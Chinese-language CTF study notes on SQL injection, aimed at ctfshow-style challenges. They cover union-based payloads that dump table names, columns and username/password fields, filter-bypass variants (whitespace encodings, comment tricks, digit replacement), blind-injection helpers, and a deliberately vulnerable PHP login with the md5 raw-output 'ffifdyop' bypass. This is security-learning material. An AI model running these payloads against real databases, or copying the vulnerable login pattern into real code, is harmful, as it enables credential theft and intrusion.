# 1.SQLmap 工具的使用



# 2.sql基本操作

1.判断是字符型还是数字型，使用2-1来判断

2.如果是字符型，判断闭合方式，' " ')  ")

3.判断查询列数，order by, group by

4.查询回显位置 -1' union select 1,2,3 --+

## 1.union注入

查询表名

```
2' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--+
```

查询列名

```
2' union select 1,group_concat(column_name) from information_schema.columns where table_name='ctfshow_user2' --+
```

查询内容

```
2' union select 1,group_concat(id,username,password) from ctfshow_user2 --+
```

## 2.盲注

### sql内置函数

%在sql中统配N个字符

_:统配一个字符

like……%进行模糊匹配

regexp进行正则匹配

```
正则表达式匹配的字符类
.：匹配任意单个字符。
^：匹配字符串的开始。
$：匹配字符串的结束。
*：匹配零个或多个前面的元素。
+：匹配一个或多个前面的元素。
?：匹配零个或一个前面的元素。
[abc]：匹配字符集中的任意一个字符。
[^abc]：匹配除了字符集中的任意一个字符以外的字符。
[a-z]：匹配范围内的任意一个小写字母。
[0-9]：匹配一个数字字符。
\w：匹配一个字母数字字符（包括下划线）。
\s：匹配一个空白字符。
```



HAVING 子句允许指定条件来过滤将出现在最终结果中的分组结果。

WHERE 子句在所选列上设置条件，而 HAVING 子句则在由 GROUP BY 子句创建的分组上设置条件。

where被过滤时还可以使用right/left/inner join 



盲注时数字被过滤，在js中数字几就是几个true

```
def createNum(n):
    num = 'true'
    if n == 1:
        return 'true'
    else:
        for i in range(n - 1):
            num += "+true"
    return num
   
```



BENCHMARK函数 用来测试数据库中特定表达式的执行时间，

BENCHMARK(loop_count, expr)，其中loop_count是循环次数，expr是要循环的表达式。

# 2.过滤

## 1.对数字输入有过滤

<font color=red>select 1,2,3也可以是select 'a','b','c'</font>

查询表名

```
1' union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(group_concat(table_name),'1','A'),'2','B'),'3','C'),'4','D'),'5','E'),'6','F'),'7','G'),'8','H'),'9','I'),'0','J') from information_schema.tables where table_schema=database()--+
```

查询列名

```
1' union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(group_concat(column_name),'1','A'),'2','B'),'3','C'),'4','D'),'5','E'),'6','F'),'7','G'),'8','H'),'9','I'),'0','J') from information_schema.columns where table_name='ctfshow_user4'--+
```

查询内容

```
1' union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(group_concat(password),'1','A'),'2','B'),'3','C'),'4','D'),'5','E'),'6','L'),'7','Q'),'8','H'),'9','I'),'0','J') from ctfshow_user4--+
```

## 2.union select 过滤

大小写绕过：Union Select

## 3.空格过滤

1.空格过滤使用括号绕过或者

%20 %09 %0a %0b %0c %0d %0e %0f %a0 %00 /**/ /\*\!\*/

  

### **%09绕过**

```
1'%09union%09select%091,2,group_concat(table_name)%09from%09information_schema.tables%09where%09table_schema=database()%23
```

```
1'%09union%09select%091,2,group_concat(column_name)%09from%09information_schema.columns%09where%09table_name='ctfshow_user'%23
```

```
1'%09union%09select%091,2,group_concat(id,username,password)%09from%09ctfshow_user%23
```

### **%20绕过**

```
1'%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23
```

```
1'%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name='ctfshow_user'%23
```

```
1'%20union%20select%201,2,group_concat(id,username,password)%20from%20ctfshow_user%23
```

### /**/绕过

```
1'/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()%23
```

```
1'/**/union/**/select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='ctfshow_user'%23
```

```
1'/**/union/**/select/**/1,2,group_concat(id,username,password)/**/from/**/ctfshow_user%23
```

### %0c绕过

```
1'%0cunion%0cselect%0c1,2,group_concat(table_name)%0cfrom%0cinformation_schema.tables%0cwhere%0ctable_schema=database()%23
```

```
1'%0cunion%0cselect%0c1,2,group_concat(column_name)%0cfrom%0cinformation_schema.columns%0cwhere%0ctable_name='ctfshow_user'%23
```

```
1'%0cunion%0cselect%0c1,2,group_concat(id,username,password)%0cfrom%0cctfshow_user%23
```



## 4.--+过滤

使用#

或者%23

或者--%20(--加空格绕过，空格可以用%0c,%09……)

## 5.and和or

and的优先级高于or

```
select id,username,password from ctfshow_user where username != 'flag' and id = '0'or(id=26)and'1' limit 1;

select id,username,password from ctfshow_user where username != 'flag' and id = '0'or(id=26)and'1' limit 1;
```

## 6.md5($str,true)类型绕过

源码：

```php
<?php
        $flag="";
		$password=$_POST['password'];
		if(strlen($password)>10){
			die("password error");
		}
		$sql="select * from user where username ='admin' and password ='".md5($password,true)."'";
		$result=mysqli_query($con,$sql);
			if(mysqli_num_rows($result)>0){
					while($row=mysqli_fetch_assoc($result)){
						 echo "登陆成功<br>";
						 echo $flag;
					 }
			}
    ?>


```

在mysql里面，在用作布尔型判断时，以数字开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。

想办法将内容转换为

```
SELECT * FROM admin WHERE pass=’ ‘or ’ 6’
```

 ffifdyop、129581926211651571912466741651878684928这两个字符串经过md5(password,true)之后，首位是数字

